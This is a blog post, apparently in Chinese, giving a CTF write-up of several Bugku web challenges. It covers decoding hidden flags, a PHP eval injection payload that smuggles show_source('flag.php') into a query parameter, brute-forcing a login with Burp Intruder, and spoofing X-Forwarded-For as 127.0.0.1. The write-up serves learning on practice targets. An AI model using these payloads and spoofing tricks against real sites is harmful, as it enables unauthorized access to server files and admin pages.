+<article class="post-entry tag-entry"> 
+<figure class="entry-cover">
+            <img loading="lazy" src="http://localhost:1313/posts/ctf-bugku-writeup/image-20211114140949068.png" alt="">
+</figure>
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">bugku writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 纪念那段岁月
+web3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl&#43;u查看源代码，发现一串
+&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115; &amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45; &amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt; 这是unicode，转码即可
+你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包
+本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。
+payload：/index.php?hello = show_source(‘flag.php’) 网上的payload：/index.php?hello=1);show_source(‘flag.php’);var_dump(
+域名解析 编辑etc/hosts添加一条123.206.87.240	flag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。
+反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。
+添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）
+你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag
+变量1 函数知识： isset（）判断是否有输入 pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w&#43;的意思是09 az A~Z， 输入的内容被限定了，所以不能输入代码
+输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag
+Web5 查看源代码，发现jother编码，打开控制台输入就行了
+头等舱 打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有， 点击显示头文件源代码，显示flag（注释形式）
+网站被黑 扫描端口
+发现登陆界面
+然后用burpsuite的intruder功能破解
+管理员系统 实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端， 也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理， 都会在尾部添加一个代理的ip， X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。 同时查看网页源代码发现，有一串注释，查到说是base64编码， 特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截， 添加X-Forwarded-For：127。0.0.1后发送，得到了flag
+参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html
+web4 查看源代码，发现一串url编码的东西， Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：
+import urllib a = &#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74 %28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c %65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29% 3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70 %65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#39; b = &#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d %3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72 %74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72 %65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45 %6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75 %65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#39; print urllib.unquote(a&#43;b) 得到代码如下：
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2019-04-22 04:13:30 +0000 UTC'>April 22, 2019</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1011 words&nbsp;·&nbsp;ch4ser</footer>
+  <a class="entry-link" aria-label="post link to bugku writeup" href="http://localhost:1313/posts/ctf-bugku-writeup/"></a>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">ch4ser の 超元域</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
